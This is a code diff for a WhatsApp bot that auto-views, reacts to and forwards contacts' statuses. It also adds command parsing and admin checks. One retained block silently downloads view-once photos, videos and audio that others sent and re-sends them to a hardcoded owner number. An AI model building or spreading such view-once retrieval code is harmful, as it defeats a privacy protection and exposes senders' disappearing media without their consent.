@@ -133,24 +133,21 @@ Type *.menu* to see commands
 
   nethmina.ev.on("creds.update", saveCreds);
 
- // ====================== STATUS AUTO SEEN + AUTO REACT + FORWARD ======================
-nethmina.ev.on("messages.upsert", async ({ messages }) => {
-  for (const msg of messages) {
-    if (msg.key.remoteJid === "status@broadcast") {
-      
-      // 🚨 මේ පේළිය අනිවාර්යයෙන්ම තියෙන්න ඕනේ loop එක නවත්තන්න
-      if (msg.message?.reactionMessage) return; 
+  // ====================== STATUS AUTO SEEN + AUTO REACT + FORWARD ======================
+  nethmina.ev.on("messages.upsert", async ({ messages }) => {
+    for (const msg of messages) {
+      if (msg.key.remoteJid === "status@broadcast") {
+        
+        if (msg.message?.reactionMessage) return; 
 
-      const senderJid = msg.key.participant || msg.key.remoteJid;
-      const senderName = msg.pushName || senderJid.split('@')[0];
-      const mentionJid = senderJid.includes("@s.whatsapp.net") ? senderJid : senderJid + "@s.whatsapp.net";
-      
-      const body = msg.message?.conversation || 
-                   msg.message?.extendedTextMessage?.text || 
-                   msg.message?.imageMessage?.caption || 
-                   msg.message?.videoMessage?.caption || "";
-
-      // ... (ඉතිරි code එක කලින් වගේම තියන්න)
+        const senderJid = msg.key.participant || msg.key.remoteJid;
+        const senderName = msg.pushName || senderJid.split('@')[0];
+        const mentionJid = senderJid.includes("@s.whatsapp.net") ? senderJid : senderJid + "@s.whatsapp.net";
+        
+        const body = msg.message?.conversation || 
+                     msg.message?.extendedTextMessage?.text || 
+                     msg.message?.imageMessage?.caption || 
+                     msg.message?.videoMessage?.caption || "";
 
         // --- 1. AUTO SEEN ---
         try {
@@ -216,6 +213,7 @@ nethmina.ev.on("messages.upsert", async ({ messages }) => {
       }
     }
   });
+
   // ====================== MESSAGE HANDLING ======================
   nethmina.ev.on("messages.upsert", async ({ messages }) => {
     for (const mek of messages) {
@@ -232,9 +230,13 @@ nethmina.ev.on("messages.upsert", async ({ messages }) => {
       const body =
         type === "conversation"
           ? mek.message.conversation
-          : mek.message[type]?.text ||
-            mek.message[type]?.caption ||
-            "";
+          : type === "extendedTextMessage"
+          ? mek.message.extendedTextMessage.text
+          : type === "imageMessage"
+          ? mek.message.imageMessage.caption
+          : type === "videoMessage"
+          ? mek.message.videoMessage.caption
+          : "";
 
       const sender = mek.key.fromMe
         ? nethmina.user.id
@@ -242,33 +244,22 @@ nethmina.ev.on("messages.upsert", async ({ messages }) => {
 
       const senderNumber = sender.split("@")[0];
 
-     // ====================== VIEW ONCE AUTO RETRIEVE (FINAL FIX) ======================
+      // ====================== VIEW ONCE AUTO RETRIEVE ======================
       if (mek.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
           const quoted = mek.message.extendedTextMessage.contextInfo.quotedMessage;
           const mtype = Object.keys(quoted)[0];
-          
-          // 1. View Once ද කියා පරීක්ෂා කිරීම
           if (quoted[mtype]?.viewOnce) {
-              
-              // 2. එවූ පුද්ගලයා Owner ද කියා පරීක්ෂා කිරීම (නම්බර් එක කෙලින්ම පරීක්ෂා කරයි)
               const isMyMessage = sender.includes("94760860835");
-
               if (isMyMessage) {
                   try {
                       const mediaMsg = quoted[mtype];
-                      
-                      // Media එක download කිරීම
                       const stream = await downloadContentFromMessage(
                           mediaMsg,
                           mtype === "imageMessage" ? "image" : mtype === "videoMessage" ? "video" : "audio"
                       );
-                      
                       let buffer = Buffer.from([]);
-                      for await (const chunk of stream) {
-                          buffer = Buffer.concat([buffer, chunk]);
-                      }
+                      for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
 
-                      // මැසේජ් එක යැවිය යුතු Target (ඔයාගේ Inbox)
                       const targetJid = "94760860835@s.whatsapp.net";
                       const captionText = `📥 *View Once Retrieved*\n👤 From Chat: ${from}\n📝 Caption: ${mediaMsg.caption || "No caption"}`;
 
@@ -281,16 +272,52 @@ nethmina.ev.on("messages.upsert", async ({ messages }) => {
                           messageContent = { audio: buffer, mimetype: mediaMsg.mimetype || "audio/mp4", ptt: mediaMsg.ptt || false };
                       }
 
-                      // 3. කෙලින්ම ඔයාගේ Inbox එකට යැවීම
                       if (Object.keys(messageContent).length > 0) {
                           await nethmina.sendMessage(targetJid, messageContent);
-                          console.log("✅ View once successfully sent to Owner!");
                       }
                   } catch (e) {
                       console.log("❌ View Once Process Error:", e);
                   }
               }
           }
+      }
+
+      // ====================== COMMAND PARSING ======================
+      const isCmd = body.startsWith(prefix);
+      const commandName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : "";
+      const args = body.trim().split(/ +/).slice(1);
+      const q = args.join(" ");
+
+      const reply = (txt) =>
+        nethmina.sendMessage(from, { text: txt }, { quoted: mek });
+
+      // ====================== GLOBAL PERMISSIONS ======================
+      const isGroup = from.endsWith('@g.us');
+      const isMe = mek.key.fromMe;
+      const isOwner = ownerNumber.includes(senderNumber) || isMe;
+
+      let isAdmins = false;
+      let isBotAdmins = false;
+
+      if (isGroup) {
+          try {
+              const groupMetadata = await nethmina.groupMetadata(from);
+              const participants = groupMetadata.participants;
+              const user = participants.find(p => p.id === sender);
+              isAdmins = user && (user.admin === 'admin' || user.admin === 'superadmin');
+              const bot = participants.find(p => p.id === (nethmina.user.id.split(':')[0] + '@s.whatsapp.net'));
+              isBotAdmins = bot && (bot.admin === 'admin' || bot.admin === 'superadmin');
+          } catch (e) {
+              isAdmins = false;
+              isBotAdmins = false;
+          }
+      }
+
+      // Auto-react for owner
+      if (isOwner && isCmd) {
+        await nethmina.sendMessage(from, {
+          react: { text: "🧑🏻‍💻", key: mek.key }
+        });
       }
 
       // ====================== COMMAND HANDLER ======================
@@ -303,7 +330,6 @@ nethmina.ev.on("messages.upsert", async ({ messages }) => {
 
         if (cmd) {
           try {
-            // Quoted message එක ගොඩනැගීම (ප්ලගින් එක ඇතුළේ කෙලින්ම පාවිච්චි කිරීමට)
             const quoted = mek.message[type]?.contextInfo?.quotedMessage ? {
                 id: mek.message[type].contextInfo.stanzaId,
                 sender: mek.message[type].contextInfo.participant,
@@ -322,7 +348,7 @@ nethmina.ev.on("messages.upsert", async ({ messages }) => {
               isOwner,
               isAdmins,
               isBotAdmins,
-              quoted // නිවැරදි quoted object එක
+              quoted
             });
           } catch (e) {
             console.log("PLUGIN ERROR:", e);
@@ -348,6 +374,7 @@ nethmina.ev.on("messages.upsert", async ({ messages }) => {
       }
     }
   });
+
   // ====================== MESSAGE DELETE EVENT ======================
   nethmina.ev.on("messages.update", async (updates) => {
     for (const plugin of global.pluginHooks) {
